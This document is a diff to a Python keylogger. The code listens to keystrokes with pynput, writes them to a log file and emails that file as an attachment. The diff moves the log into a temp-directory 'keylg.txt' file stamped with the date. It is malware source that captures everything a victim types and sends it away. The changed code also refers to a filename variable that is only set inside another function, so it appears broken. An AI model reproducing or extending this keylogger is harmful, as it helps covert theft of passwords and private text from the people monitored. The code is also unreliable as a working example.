@@ -9,6 +9,8 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import socket #3
+import tempfile #4
+from datetime import date #5
 
 # functions
 def writetofile(key):
@@ -20,7 +22,7 @@ def writetofile(key):
     for j in range(len(keystroke)):
         if keystroke[j] == char:
             char = char.replace(keystroke[j], value[j])
-    with open("file.txt", 'a') as f:
+    with open(filename, 'a') as f:
         f.write(char)
         
 def emailsender():
@@ -35,8 +37,8 @@ def emailsender():
 
     msg.attach(MIMEText('log', 'plain')) # wite body here
 
-    filename = "file.txt" #extension imp
-    attachment = open('file.txt', 'rb')
+    #extension imp
+    attachment = open(filename, 'rb')
 
     p = MIMEBase('application', 'octet-stream')
     p.set_payload((attachment).read())
@@ -61,6 +63,16 @@ def is_connected():
     except:
         pass
         print(False)
-        
+def filecreation():
+    filename = save + '\\keylg' + '.txt'
+    a = open (filename, "w+")
+    a.write(str(date.today())) #5
+
+# main    
+save = tempfile.mkdtemp('file') #4
+print (save)
+filecreation()
+
+       
 with Listener(on_press=writetofile) as l:
     l.join()
